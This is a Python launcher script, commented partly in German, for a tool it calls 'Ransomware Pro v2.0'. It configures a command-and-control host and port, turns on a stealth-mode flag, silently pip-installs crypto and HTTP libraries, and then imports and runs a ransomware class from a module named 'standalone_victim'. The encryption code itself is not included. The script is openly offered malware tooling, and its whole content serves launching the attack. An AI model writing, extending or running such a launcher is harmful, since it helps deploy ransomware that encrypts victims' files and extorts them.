#!/usr/bin/env python3
"""
RANSOMWARE PRO - UNIVERSAL AUTO-LAUNCHER
=========================================
Startet Ransomware mit korrektem Environment Setup
"""

import os
import sys
import subprocess

def setup_environment(c2_host='192.168.126.200'):
    """Setup Environment Variables"""
    os.environ['C2_HOST'] = c2_host
    os.environ['C2_PORT'] = '5000'
    os.environ['STEALTH_MODE'] = 'true'
    os.environ['PYTHONUNBUFFERED'] = '1'
    print(f"[+] Environment setup: C2_HOST={c2_host}:5000")

def install_soft_dependencies():
    """Installiere optional dependencies (nicht kritisch)"""
    print("[*] Checking optional dependencies...")
    
    optional = [
        ('cryptography', 'cryptography'),
        ('requests', 'requests'),
    ]
    
    for module, package in optional:
        try:
            __import__(module)
        except ImportError:
            print(f"[*] Installing {package}...")
            try:
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', '-q', package],
                    timeout=120,
                    capture_output=True
                )
                print(f"[+] {package} installed")
            except Exception as e:
                print(f"[!] Could not install {package}: {e}")
                print("[*] Continuing anyway (standalone mode)...")

def run_ransomware():
    """Starte die Ransomware"""
    print("\n" + "="*60)
    print("RANSOMWARE PRO v2.0 - STARTING...")
    print("="*60 + "\n")
    
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from standalone_victim import StandaloneRansomware
        
        print("[+] Ransomware module loaded successfully")
        
        ransomware = StandaloneRansomware()
        print("[*] Initializing ransomware core...")
        
        ransomware.run()
    
    except ImportError as e:
        print(f"[!] Import Error: {e}")
        print("[*] Trying to install dependencies and retry...")
        install_soft_dependencies()
        
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from standalone_victim import StandaloneRansomware
            
            ransomware = StandaloneRansomware()
            ransomware.run()
        except Exception as e:
            print(f"[!] Fatal Error: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)
    
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

def main():
    """Main entry point"""
    print("="*60)
    print("RANSOMWARE PRO v2.0 - AUTO LAUNCHER")
    print("="*60)
    print()
    
    c2_host = sys.argv[1] if len(sys.argv) > 1 else '192.168.126.200'
    
    print(f"[*] C2 Server: {c2_host}:5000")
    print()
    
    try:
        setup_environment(c2_host)
        install_soft_dependencies()
        run_ransomware()
    
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
